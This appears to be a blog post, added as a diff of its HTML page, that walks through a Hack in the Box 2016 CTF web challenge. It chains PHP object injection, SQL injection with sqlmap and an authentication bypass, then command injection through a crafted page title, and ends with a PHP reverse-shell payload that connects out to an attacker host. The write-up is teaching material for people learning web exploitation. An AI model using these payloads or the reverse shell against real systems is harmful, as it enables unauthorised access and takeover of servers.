@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Riley Kidd - Hack in the Box 2016 - MISC400 Writeup (Part 1)</title>
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/assets/css/all.css">
+  <link rel="alternate" type="application/atom+xml" title="Riley Kidd" href="http://0.0.0.0:4000/atom.xml" />
+</head>
+<body>
+  <div class="container">
+    <div class="three columns sidebar">
+      <nav>
+  <h2 id="banner"><a href="/">Riley Kidd</a></h2>
+  <div id="bio">
+    <p>Security from a different perspective</p>
+  </div>
+  <div id="social">
+    <div id="stalker">
+  
+  
+  <a title="LinkedIn" href="https://www.linkedin.com/in/rileykidd">
+    <i class="fa fa-linkedin-square"></i>
+  </a>
+  
+  
+  <a title="Send an email" href="mailto:rileykidd@protonmail.com">
+    <i class="fa fa-envelope-square"></i>
+  </a>
+  
+  
+  <a title="Atom feed" id="atom" href="/atom.xml">
+    <i class="fa fa-rss-square"></i>
+  </a>
+  
+</div>
+
+  </div>
+</nav>
+
+    </div>
+    <div class="nine columns content">
+      <h1 class="title">Hack in the Box 2016 - MISC400 Writeup (Part 1)</h1>
+<p class="meta">
+  June 09, 2016
+</p>
+<div id="post">
+  <h2 id="the-challenge">The challenge</h2>
+
+<p>This year the CTF prize sponsors <a href="http://www.beyondsecurity.com/">Beyond Security</a> contributed a 400 point challenge:</p>
+
+<blockquote>
+  <p>MISC400 - Above and Beyond<br />
+Even chefs need a bit of help sometimes, especially when it comes to IT related subjects.<br />
+Luckily, the guys at Beyond Security are always willing to offer a helping hand through their IT blog.<br />
+So, if you have any trouble, try the blog at <a href="http://145.111.225.63/">http://145.111.225.63/</a></p>
+</blockquote>
+
+<h2 id="the-basics">The basics</h2>
+
+<p>Visiting this blog presented us with the following website:
+<a href="/assets/images/1-768x348.png" data-lightbox="1"><img src="/assets/images/1-768x348.png" alt="" /></a></p>
+
+<p>Browsing the website we identified a number of read only, static pages - nothing particularly interesting. However, by viewing the <code class="highlighter-rouge">CSS</code> source we identify the following:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nx">form</span><span class="o">-</span><span class="nx">signin</span> <span class="nx">input</span><span class="p">[</span><span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">]</span> <span class="p">{</span>
+    <span class="nx">margin</span><span class="o">-</span><span class="nx">bottom</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="nx">px</span><span class="p">;</span>
+    <span class="nx">border</span><span class="o">-</span><span class="nx">bottom</span><span class="o">-</span><span class="nx">right</span><span class="o">-</span><span class="nx">radius</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">border</span><span class="o">-</span><span class="nx">bottom</span><span class="o">-</span><span class="nx">left</span><span class="o">-</span><span class="nx">radius</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">.</span><span class="nx">form</span><span class="o">-</span><span class="nx">signin</span> <span class="nx">input</span><span class="p">[</span><span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">]</span> <span class="p">{</span>
+    <span class="nx">margin</span><span class="o">-</span><span class="nx">bottom</span><span class="p">:</span> <span class="mi">10</span><span class="nx">px</span><span class="p">;</span>
+    <span class="nx">border</span><span class="o">-</span><span class="nx">top</span><span class="o">-</span><span class="nx">left</span><span class="o">-</span><span class="nx">radius</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">border</span><span class="o">-</span><span class="nx">top</span><span class="o">-</span><span class="nx">right</span><span class="o">-</span><span class="nx">radius</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So, there must be a form available somewhere, eventually one of the usual suspects gives a hit and we find the admin panel:</p>
+
+<blockquote>
+  <p><a href="http://145.111.225.63/admin/">http://145.111.225.63/admin/</a></p>
+</blockquote>
+
+<p><a href="/assets/images/2-768x173.png" data-lightbox="1"><img src="/assets/images/2-768x173.png" alt="" /></a></p>
+
+<p>This admin panel requires authentication and the ‘hint’ implies brute forcing is not a good solution. Luckily, the <code class="highlighter-rouge">HTML</code> source gives our next hint, backups are stored on the server:</p>
+
+<blockquote>
+  <p><a href="http://145.111.225.63/admin/backup/">http://145.111.225.63/admin/backup/</a></p>
+</blockquote>
+
+<p>Accessing this directory we identify a number of backup archives are accessible:</p>
+
+<p><a href="/assets/images/3-hitb.png" data-lightbox="1"><img src="/assets/images/3-hitb.png" alt="" /></a></p>
+
+<p>Selecting a backup archive at random, we find it is password protected.</p>
+
+<p>So, let’s try them all:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget --mirror http://145.111.225.63/admin/backup/
+for a in *.tar.gz; do tar -zxvf $a; done
+</code></pre></div></div>
+
+<p>With access to the source code, things start to get interesting:</p>
+
+<p><a href="/assets/images/4-hitb.png" data-lightbox="1"><img src="/assets/images/4-hitb.png" alt="" /></a></p>
+
+<h2 id="needle-in-the-haystack">Needle in the haystack</h2>
+
+<p>After some precursory browsing of the source code, we find the <code class="highlighter-rouge">Session</code> class to be particularly interesting. The <code class="highlighter-rouge">Session</code> class is implemented as a singleton and can be directly initialised through the admin directory, via either the <code class="highlighter-rouge">index.php</code> or <code class="highlighter-rouge">manage.php</code> URLs.</p>
+
+<p><a href="/assets/images/5.png" data-lightbox="1"><img src="/assets/images/5.png" alt="" /></a></p>
+
+<p>This <code class="highlighter-rouge">Session</code> class contains (among others) the following functions:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">loadSession</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">createTempSession</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">private</span> <span class="k">function</span> <span class="nf">loadSession</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$decoded_data</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$decoded_data</span><span class="p">);</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sessionid</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">[</span><span class="s1">'sessionid'</span><span class="p">];</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_data_arr</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So, we have an arbitrary object injection when the <code class="highlighter-rouge">Session</code> object is initialised.</p>
+
+<p>The question becomes, what can we do with this?</p>
+
+<h2 id="tracing-our-flows">Tracing our flows</h2>
+
+<p>With these kinds of challenges (i.e. too many lines of source code), I always prefer to draw the call graphs to trace the function flows and thereby gain a clearer understanding of how the application works and which functions we can call.</p>
+
+<p>To prevent unnecessary confusion from the scratchings I made during the CTF, I have reproduced these graphs with the help of <a href="http://dia-installer.de/">Dia</a>.</p>
+
+<p>Below, we can see the function flow (as seen in the source above) to reach the vulnerable <code class="highlighter-rouge">unserialise</code> call with our user supplied data:</p>
+
+<p><a href="/assets/images/6-hitb.png" data-lightbox="1"><img src="/assets/images/6-hitb.png" alt="" /></a></p>
+
+<p>Now we have a clear understanding of how to reach the vulnerable function call, we can start looking for ways to abuse this object injection.</p>
+
+<h2 id="digging-deeper">Digging deeper</h2>
+
+<p>Via the <code class="highlighter-rouge">User</code> class, we identify the following function:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="nf">rewind</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$con</span> <span class="o">=</span> <span class="nx">Database</span><span class="o">::</span><span class="na">getInstance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getConnection</span><span class="p">();</span>
+    <span class="nv">$users_table</span> <span class="o">=</span> <span class="nx">Config</span><span class="o">::</span><span class="na">getInstance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getTables</span><span class="p">()[</span><span class="s1">'users'</span><span class="p">];</span>
+    <span class="nv">$escaped_user</span> <span class="o">=</span> <span class="nv">$con</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_user</span><span class="p">);</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT `last_login` FROM `</span><span class="nv">$users_table</span><span class="s2">` WHERE `user`=</span><span class="nv">$escaped_user</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$con</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_access_time</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">(</span><span class="nx">MYSQLI_ASSOC</span><span class="p">)[</span><span class="s1">'last_login'</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As we can see, an SQL query is generated utilising an escaped version of the <code class="highlighter-rouge">User</code> object’s <code class="highlighter-rouge">_user</code> variable. However, prior to being inserted into the query, the data is sanitised using PHP’s <a href="http://php.net/manual/en/mysqli.real-escape-string.php">real_escape_string</a>.</p>
+
+<p>As per the documentation (and assuming ‘regular’ character sets), PHP’s <code class="highlighter-rouge">real_escape_string</code> call encodes the following characters:</p>
+
+<blockquote>
+  <p>Characters encoded are <em>NUL (ASCII 0), \n, \r, \, ‘, “, and Control-Z</em>.</p>
+</blockquote>
+
+<p>As per the function above, the escaped user input is not enclosed within quotes, therefore this function is still vulnerable to SQL injection attacks.</p>
+
+<p>As an example, we can circumvent the <code class="highlighter-rouge">real_escape_string</code> call by creating a <code class="highlighter-rouge">User</code> object with a username of ‘<code class="highlighter-rouge">1 or sleep(5)</code>’, which will result in the following SQL query after sanitisation (and will cause the database to sleep for 5 seconds):</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="s1">'last_login'</span> <span class="k">FROM</span> <span class="s1">'$users_table'</span> <span class="k">WHERE</span> <span class="s1">'user'</span><span class="o">=</span><span class="mi">1</span> <span class="k">or</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="s1">'
+</span></code></pre></div></div>
+
+<p>The only problem with this path of attack is the <code class="highlighter-rouge">rewind</code> function is never called by the application..</p>
+
+<h2 id="calling-uncallable-functions">Calling uncallable functions</h2>
+
+<p>Taking a closer look at the <code class="highlighter-rouge">User</code> class, we see it implements the <a href="http://php.net/manual/en/class.iterator.php">Iterator</a> interface. This interface allows the associated object to be used as part of a <code class="highlighter-rouge">foreach</code> loop. To facilitate this, the interface permits custom implementations of the following functions:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">abstract</span> <span class="k">public</span> <span class="nx">mixed</span> <span class="nb">current</span> <span class="p">(</span> <span class="kt">void</span> <span class="p">)</span>
+<span class="k">abstract</span> <span class="k">public</span> <span class="nx">scalar</span> <span class="nb">key</span> <span class="p">(</span> <span class="kt">void</span> <span class="p">)</span>
+<span class="k">abstract</span> <span class="k">public</span> <span class="kt">void</span> <span class="nb">next</span> <span class="p">(</span> <span class="kt">void</span> <span class="p">)</span>
+<span class="k">abstract</span> <span class="k">public</span> <span class="kt">void</span> <span class="nb">rewind</span> <span class="p">(</span> <span class="kt">void</span> <span class="p">)</span>
+<span class="k">abstract</span> <span class="k">public</span> <span class="nx">boolean</span> <span class="nx">valid</span> <span class="p">(</span> <span class="kt">void</span> <span class="p">)</span>
+</code></pre></div></div>
+
+<p>As per the PHP documentation, <a href="http://php.net/manual/en/iterator.rewind.php">rewind</a> is used to ‘rewind the Iterator to the first element’ and is the first method called at the start of a <code class="highlighter-rouge">foreach</code> loop.</p>
+
+<p>With this understanding, the SQL injection can be triggered as follows:</p>
+<ul>
+  <li>Create a <code class="highlighter-rouge">User</code> object with a customisable username</li>
+  <li>Utilise this object in a <code class="highlighter-rouge">foreach</code> loop to trigger the <code class="highlighter-rouge">Iterator</code> (thereby <code class="highlighter-rouge">rewind</code>ing to the first element)</li>
+  <li>Perform the SQL injection via the insecure <code class="highlighter-rouge">real_escape_string</code> sanitisation</li>
+  <li>Extract the administrator’s username and password</li>
+</ul>
+
+<p>As we identified in the code snippet above, the <code class="highlighter-rouge">loadSession</code> function is called with our user supplied data as part of a cookie. This function takes the cookie data, <code class="highlighter-rouge">base64_decodes</code> it, <code class="highlighter-rouge">unserialises</code> it, then finally performs a <code class="highlighter-rouge">foreach</code> loop to map the data as part of an <code class="highlighter-rouge">array</code> within the object.</p>
+
+<p>Using this information, we can create our own dummy function, which creates a custom serialised object matching the conditions outlined in our above attack:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="nf">fast_forward</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="err">   </span> <span class="nv">$final</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+<span class="err">       </span> <span class="s1">'sessionid'</span> <span class="o">=&gt;</span> <span class="s1">'a'</span><span class="p">,</span>
+<span class="err">       </span> <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s1">'b'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+<span class="err">   </span> <span class="p">);</span>
+    <span class="nv">$session</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$final</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Setting the <code class="highlighter-rouge">$session</code> output as our session cookie and accessing the application will cause the above attack chain to be triggered.</p>
+
+<h2 id="automating-the-injection">Automating the injection</h2>
+
+<p>To make life easier, we can set-up a local proxy:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="s2">"http://145.111.225.63/admin/index.php"</span><span class="p">);</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">"Cookie: session=</span><span class="nv">$session</span><span class="s2">;PHPSESSID=5rsdlv7c8gnetb6jbj3h313gs5"</span><span class="p">));</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nv">$output</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>  
+<span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Then allow <a href="http://sqlmap.org/">sqlmap</a> to perform the heavy lifting:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://127.0.0.1/p.php?1=1" -p1 --level=5 --risk=3 --sql-shell
+</code></pre></div></div>
+
+<p>Once the injection point is identified, we can perform arbitrary SQL commands against the server database, such as extracting the username and password of the admin user:</p>
+
+<p><a href="/assets/images/7-hitb.png" data-lightbox="1"><img src="/assets/images/7-hitb.png" alt="" /></a></p>
+
+<h2 id="tracing-our-flows-again">Tracing our flows (again)</h2>
+
+<p>Now we have access to both the username and the MD5 password for the admin user of the application. Assuming this MD5 cannot be trivially cracked, we need to find another way to abuse this information.</p>
+
+<p>Via the application there are two ways to attempt to access the administrative panel, either via <code class="highlighter-rouge">index.php</code> or <code class="highlighter-rouge">manage.php</code> which result in a slightly different authorisation check.</p>
+
+<p>Via <code class="highlighter-rouge">index.php</code> we can access functions in the following paths:</p>
+
+<p><a href="/assets/images/8-hitb.png" data-lightbox="1"><img src="/assets/images/8-hitb.png" alt="" /></a></p>
+
+<p>Via <code class="highlighter-rouge">manage.php</code> we can access functions in the following paths:</p>
+
+<p><a href="/assets/images/9-hitb.png" data-lightbox="1"><img src="/assets/images/9-hitb.png" alt="" /></a></p>
+
+<p>Therefore, it is possible to instantiate our <code class="highlighter-rouge">User</code> object and influence the subsequent <code class="highlighter-rouge">checkPassword</code> authorisation flow with different <code class="highlighter-rouge">boolean</code> values for the <code class="highlighter-rouge">_is_session</code> parameter:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="nf">checkPassword</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">selectDataByUser</span><span class="p">();</span>
+        <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_password</span><span class="p">;</span>	
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_is_session</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
+        <span class="p">}</span>	
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$pass</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="cm">/* Update the login time */</span>
+            <span class="cm">/* TODO: Maybe not the right place to update the login time? */</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">updateLogin</span><span class="p">();</span>
+            <span class="k">return</span> <span class="kc">True</span><span class="p">;</span>
+        <span class="p">}</span>	
+    <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Since we already know the MD5 value of the password (via the SQL injection), we want the <code class="highlighter-rouge">_is_session</code> parameter to be set to <code class="highlighter-rouge">true</code>, thereby skipping the function. We can achieve this condition with a secondary object injection attack:</p>
+<ul>
+  <li>Create a <code class="highlighter-rouge">User</code> object with the known valid credentials</li>
+  <li>Access the function flow via <code class="highlighter-rouge">manage.php</code> (resulting in the MD5 function not being called)</li>
+  <li>Gain access to administrative functions without cracking the password</li>
+</ul>
+
+<p>We can therefore gain administrative access to the application with the following object:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">function</span> <span class="nf">md0</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$final</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+        <span class="s1">'sessionid'</span> <span class="o">=&gt;</span> <span class="s1">'a'</span><span class="p">,</span>
+        <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s1">'user'</span> <span class="o">=&gt;</span> <span class="s1">'admin'</span><span class="p">,</span>
+            <span class="s1">'pass'</span> <span class="o">=&gt;</span> <span class="s1">'b9cf928d0e7a0e2ff0e0f57e8468f7da'</span>
+        <span class="p">)</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Setting this as the session cookie in our browser and accessing the administrative interface via <code class="highlighter-rouge">manage.php</code> permits us to successfully access the application as an administrator:</p>
+
+<p><a href="/assets/images/10-hitb.png" data-lightbox="1"><img src="/assets/images/10-hitb.png" alt="" /></a></p>
+
+<h2 id="back-to-the-source">Back to the source</h2>
+
+<p>Now we are administrators, we have access to some interesting new functions:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'resolve'</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'nslookup '</span><span class="o">.</span><span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'host'</span><span class="p">])</span><span class="o">.</span><span class="s1">' 2&gt;&amp;1'</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'download'</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">'Could not download the page'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="nv">$matches</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/(.*?)&lt;\/title&gt;/'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+            <span class="nb">system</span><span class="p">(</span><span class="s2">"echo </span><span class="nv">$encoded</span><span class="s2"> &gt; files/</span><span class="nv">$matches[1]</span><span class="s2">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">'Could not fetch the filename'</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As an attacker, the <code class="highlighter-rouge">download</code> function looks most interesting. A user supplied website can be downloaded via the <code class="highlighter-rouge">file_get_contents</code> call, then a regular expression is performed against the content to obtain the website’s title. The website data is then saved in a <code class="highlighter-rouge">base64_encoded</code> format in the <code class="highlighter-rouge">files</code> directory; all within a native <code class="highlighter-rouge">system</code> call.</p>
+
+<p>The output of the website’s data is saved based on the <code class="highlighter-rouge">matches</code> array which is a result of the <a href="http://php.net/manual/en/function.preg-match.php">preg_match</a> call:</p>
+
+<blockquote>
+  <p>$matches[0] will contain the text that matched the full pattern, $matches[1] will have the text that matched the first captured parenthesized subpattern, and so on.</p>
+</blockquote>
+
+<p>As per the function definition and the above implementation, we can control the data stored within <code class="highlighter-rouge">$matches[1]</code>, by hosting our own webpage with a custom, malicious <code class="highlighter-rouge">&lt;title&gt;</code> tag which we can then abuse to break out of the underlying <code class="highlighter-rouge">system</code> call.</p>
+
+<h2 id="remote-code-execution">Remote code execution</h2>
+
+<p>As an example, we can ‘break out’ of the <code class="highlighter-rouge">system</code> call and perform <code class="highlighter-rouge">ls</code> on the local file system via the following:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">'system("echo a &gt; test;ls");'</span>
+</code></pre></div></div>
+
+<p>So, let’s set up a website on our local machine with these malicious <code class="highlighter-rouge">&lt;title&gt;</code> tags:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>Not a suspicious website;ls<span class="nt">&lt;/title&gt;</span>
+</code></pre></div></div>
+
+<p>Then download this page via the management application:</p>
+
+<p><a href="/assets/images/11-hitb.png" data-lightbox="1"><img src="/assets/images/11-hitb.png" alt="" /></a></p>
+
+<p>Finally, we have obtained code execution on the application server.</p>
+
+<p>An obvious flag was not accessible in the webroot, so the next step is to gain a shell on the server (they removed python for some reason?):</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Not</span> <span class="nx">a</span> <span class="nx">suspicious</span> <span class="nx">website</span><span class="p">;</span><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">'$sock=fsockopen("145.111.241.25",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Surely we must have earned some points by now right?</p>
+
+<p>Wrong:</p>
+
+<blockquote>
+  <p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=85ac919bb9c5311f8bdbcf2e6255814d227d8b76, not stripped</p>
+</blockquote>
+
+<p><em>Stay tuned for part 2…</em></p>
+
+</div>
+<div id="related">
+  <h3>Recent Posts</h3>
+  <ul id="blog-posts" class="posts">
+    
+    <li>
+      <span>08 Jul 2018</span> <a href="/2018/07/08/solving-CTF-challenges-with-DLL-injection/">Solving CTF challenges with DLL injection</a>
+    </li>
+    
+    <li>
+      <span>17 Oct 2017</span> <a href="/2017/10/17/a-watering-hole-with-Windows-binaries/">A watering hole with Windows binaries</a>
+    </li>
+    
+    <li>
+      <span>03 Aug 2017</span> <a href="/2017/08/03/application-whitelist-bypass-using-XLL-and-embedded-shellcode/">Application whitelist bypass using XLL and embedded shellcode</a>
+    </li>
+    
+  </ul>
+</div>
+
+      <div class="footer">
+        <div class="disclaimer">
+  
+  <p>
+    The postings on this site are my own and don't represent my employer
+  </p>
+  
+</div>
+
+      </div>
+    </div>
+  </div>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox-plus-jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({
+      google_ad_client: "ca-pub-5830883927534037",
+      enable_page_level_ads: true
+    });
+  </script>
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-41399516-1', 'auto');
+    ga('send', 'pageview');
+  </script>
+
+</body>
+</html>
